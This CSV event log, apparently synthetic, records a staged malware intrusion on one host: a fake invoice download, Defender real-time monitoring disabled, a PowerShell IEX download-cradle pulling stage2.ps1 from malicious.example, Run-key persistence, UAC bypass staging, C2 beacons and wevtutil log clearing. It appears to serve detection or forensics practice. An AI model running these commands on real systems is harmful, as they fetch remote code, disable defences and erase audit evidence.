timestamp,source,event_type,actor,target,metadata
2024-01-01T10:00:00Z,HOST01,file_download,SYSTEM,C:\temp\invoice.zip,"{""url"": ""http://malicious.example/invoice.zip""}"
2024-01-01T10:00:15Z,HOST01,network_connection,SYSTEM,185.220.101.1,"{""port"": 443, ""direction"": ""outbound"", ""reason"": ""download""}"
2024-01-01T10:00:30Z,HOST01,file_creation,SYSTEM,C:\temp\invoice.exe,"{""parent"": ""zip_extract""}"
2024-01-01T10:00:45Z,HOST01,file_creation,SYSTEM,C:\temp\readme.txt,"{""parent"": ""zip_extract""}"
2024-01-01T10:01:00Z,HOST01,process_execution,USER01,invoice.exe,"{""pid"": 2048, ""parentpid"": 1024}"
2024-01-01T10:01:10Z,HOST01,process_execution,USER01,cmd.exe,"{""pid"": 2100, ""parentpid"": 2048}"
2024-01-01T10:01:30Z,HOST01,powershell_execution,USER01,powershell.exe,"{""pid"": 2150, ""parentpid"": 2100, ""scriptblock"": ""Set-MpPreference -DisableRealtimeMonitoring $true""}"
2024-01-01T10:01:40Z,HOST01,file_download,USER01,C:\temp\stage2.ps1,"{""url"": ""http://malicious.example/stage2.ps1""}"
2024-01-01T10:01:55Z,HOST01,powershell_execution,USER01,powershell.exe,"{""pid"": 2200, ""parentpid"": 2150, ""scriptblock"": ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/stage2.ps1')""}"
2024-01-01T10:02:00Z,HOST01,registry_modification,USER01,HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\Updater,"{""value"": ""C:\\temp\\invoice.exe""}"
2024-01-01T10:02:10Z,HOST01,registry_modification,USER01,HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\Helper,"{""value"": ""C:\\temp\\stage2.ps1""}"
2024-01-01T10:02:20Z,HOST01,registry_modification,USER01,HKCU:\Software\Classes\ms-settings\shell\open\command,"{""value"": ""C:\\temp\\invoice.exe"", ""technique"": ""UAC bypass staging""}"
2024-01-01T10:02:30Z,HOST01,network_connection,invoice.exe,185.220.101.1,"{""port"": 443, ""direction"": ""outbound"", ""reason"": ""c2 beacon""}"
2024-01-01T10:02:45Z,HOST01,network_connection,invoice.exe,91.219.237.244,"{""port"": 8080, ""direction"": ""outbound"", ""reason"": ""c2 beacon secondary""}"
2024-01-01T10:03:00Z,HOST01,log_deletion,USER01,Security.evtx,"{""method"": ""wevtutil cl""}"
2024-01-01T10:03:10Z,HOST01,log_deletion,USER01,System.evtx,"{""method"": ""wevtutil cl""}"
2024-01-01T10:03:20Z,HOST01,process_execution,USER01,wevtutil.exe,"{""pid"": 2300, ""parentpid"": 2100}"
2024-01-01T10:03:30Z,HOST01,file_creation,USER01,C:\temp\cleanup_done.flag,"{""parent"": ""wevtutil.exe""}"
